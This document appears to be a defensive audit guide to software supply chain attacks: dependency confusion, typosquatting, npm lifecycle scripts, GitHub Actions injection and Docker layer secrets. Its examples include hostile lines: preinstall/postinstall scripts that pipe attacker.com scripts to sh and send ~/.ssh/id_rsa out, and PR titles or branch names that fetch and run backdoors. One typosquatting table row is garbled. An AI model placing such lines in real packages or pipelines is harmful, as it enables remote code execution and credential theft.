# Supply Chain Security — Elite Protocol

> **Context:** Modern applications delegate trust to thousands of external dependencies. Attackers target the developer's own environment (registry, pipeline, CI/CD) to inject malicious code **before** it reaches the application. The vector is the build system itself.

**Tags:** #critical #supply-chain #npm #pypi #ci-cd #dependency-confusion
**OWASP:** A06:2021 Vulnerable & Outdated Components / A08:2021 Software & Data Integrity Failures
**CVSS Base:** 9.8 (Critical — RCE in developer environment or production build)

---

## Attack Surface Map

```
Developer Machine → [Package Registry (NPM/PyPI/Maven)] → Build System (CI/CD) → Docker Image → Production
         ↑                        ↑                             ↑                      ↑
  Typosquatting          Dependency Confusion           Script Injection        Layer Secrets
```

---

## 1. Dependency Confusion (High-Precision Corporate Attack)

**The flaw:** A project uses an internal package (e.g., `@acme/payments-utils`) not registered on public NPM. The package manager tries public registries first by default.

**Attack:**
1. Attacker discovers internal package names (from leaked `package.json`, job postings, error messages).
2. Attacker registers `@acme/payments-utils` on public NPM with version `99.0.0` (higher than internal).
3. During `npm install`, resolver prefers the public version — malicious code runs via `postinstall`.

**Detection:**
```bash
# grep_search for internal package indicators
@internal/, @company-, @corp/
```

**Verify mitigation:** `.npmrc` must have:
```
@acme:registry=https://internal.registry.acme.com
```
Without this scope-specific registry lock, public packages can substitute.

---

## 2. Typosquatting — Tactical Name Verification

**The attack:** Package names that are visual twins of widely used packages.

**Known historical examples:**
| Malicious | Legitimate |
|---|---|
| `cros-env` | `cross-env` |
| `mongose` | `mongoose` |
| `requesst` | `requests` |
| `python-dateutil` | `python-dateutil` (legitimate) vs `pyton-dateutil` |
| `colourama` | `colorama` |
| `twilio-npm` | `twilio` |

**`grep_search`:** Read all dependency manifests carefully. Flag any package name that:
- Contains unusual character substitutions or extra characters.
- Is a namespace variation of a known popular package.
- Has extremely high version numbers (>10.0.0) with minimal history.

---

## 3. Malicious Lifecycle Scripts

npm/yarn execute scripts automatically during installation. A compromised package uses this to run malicious code on every developer's machine.

**Dangerous scripts in `package.json`:**
```json
{
  "scripts": {
    "preinstall": "curl http://attacker.com/exfil.sh | sh",
    "postinstall": "node -e \"require('child_process').exec('curl -d @~/.ssh/id_rsa attacker.com')\""
  }
}
```

**`grep_search`:**
- `"preinstall":`, `"postinstall":`, `"install":` in any `package.json`.
- Inspect the value: any network call, base64 decode, or eval pattern is Critical.

**Mitigation detection:** `npm install --ignore-scripts` or `npmrc: ignore-scripts=true`.

---

## 4. CI/CD Pipeline Code Injection (GitHub Actions)

**The attack:** GitHub expressions interpolated directly into shell `run:` commands allow any PR author or issue submitter to execute arbitrary code in the pipeline.

**Vulnerable patterns:**
```yaml
# VULNERABLE — PR title is attacker-controlled
- name: Build
  run: |
    echo "Building PR: ${{ github.event.pull_request.title }}"
    # Attack: PR titled: "; curl https://attacker.com/shell.sh | bash;"
```

```yaml
# VULNERABLE — branch name injected into shell
- name: Test
  run: |
    git checkout ${{ github.head_ref }}
    # Attack: branch named: "; wget http://attacker.com/backdoor -O /tmp/b && bash /tmp/b;"
```

**`grep_search`:**
- `${{ github.event.pull_request.title }}` in `run:` steps.
- `${{ github.head_ref }}` in `run:` steps.
- `${{ github.event.issue.body }}` in `run:` steps.

**Mitigation:** Store value in env variable first (sanitizes interpolation):
```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "Building: $PR_TITLE"  # Now safe
```

---

## 5. Secrets Exposed via Workflow Logs

```yaml
# CRITICAL — prints secret to public workflow logs
- run: echo "Token is ${{ secrets.NPM_TOKEN }}"
- run: npm publish --token ${{ secrets.NPM_TOKEN }}  # Also dangerous in some log contexts
```

**`grep_search`:** `echo.*secrets.`, `print.*env.`, `console.log.*process.env`.

---

## 6. Unpinned Dependencies & Lockfile Absence

**The vector:** Using semantic ranges (`^4.17.1`, `~2.0.0`) means an attacker who compromises a dependency's next patch release injects into every install.

```json
{
  "dependencies": {
    "express": "^4.17.1"  // Accepts any 4.x.x — vulnerable to minor compromise
  }
}
```

**Elite mitigation check:**
- `package-lock.json` or `yarn.lock` must be present and committed.
- CI/CD should use `npm ci` (strict lockfile) not `npm install`.
- Python: `poetry.lock` or `pip-compile` pinned requirements.

**`grep_search`:** Absence of lockfile in repo root. `npm install` in CI vs `npm ci`.

---

## 7. Docker Image Layer Secrets

**The attack:** A multi-stage Dockerfile copies `.env` files in an early layer, then deletes them — but the secret remains in the image layer history.

```dockerfile
# VULNERABLE — secret persists in intermediate layer
COPY . .          # Copies .env
RUN rm .env       # Deletes, but layer with .env is still accessible via docker history
```

**`grep_search`:**
- `COPY . .` without corresponding `.dockerignore` that excludes `.env`, `.git`, `*.pem`.
- `ENV SECRET_KEY=` with a hardcoded value in any Dockerfile.
- `ARG AWS_SECRET_KEY` — build args are baked into image metadata.

**Verification:**
```bash
docker history <image> --no-trunc  # Reveals all layers and their commands
```

---

## Chained Exploitation Paths

```
Dependency Confusion → postinstall RCE → Developer machine compromised → SSH key stolen → Repo access
Malicious Package + CI Run → Pipeline RCE → NPM_TOKEN stolen → Malicious package published to production
CI Script Injection (PR title) → Runner shell access → AWS_SECRET_ACCESS_KEY exfiltration → Cloud compromise
Unpinned deps + compromised minor version → Production injection → Silent persistent backdoor
Docker Layer Secret → Image pulled by attacker → DB_PASSWORD extracted → Full data breach
```

---

## Strategic Checklist for Auditor
1. [ ] Scan all dependency manifests for internal package names without registry locking.
2. [ ] Read `preinstall`/`postinstall` scripts in all `package.json` files.
3. [ ] Audit all GitHub Actions `run:` steps for direct `${{ github.event... }}` interpolation.
4. [ ] Verify lockfiles are present and CI uses `npm ci` (not `npm install`).
5. [ ] Inspect Dockerfile for `COPY . .` without `.dockerignore` and `ENV`/`ARG` with secrets.
6. [ ] Verify workflow `permissions:` blocks — avoid `write-all`.

---

*Tags: #supply-chain #dependency-confusion #typosquatting #ci-cd #docker-secrets #github-actions #shiva-vault*
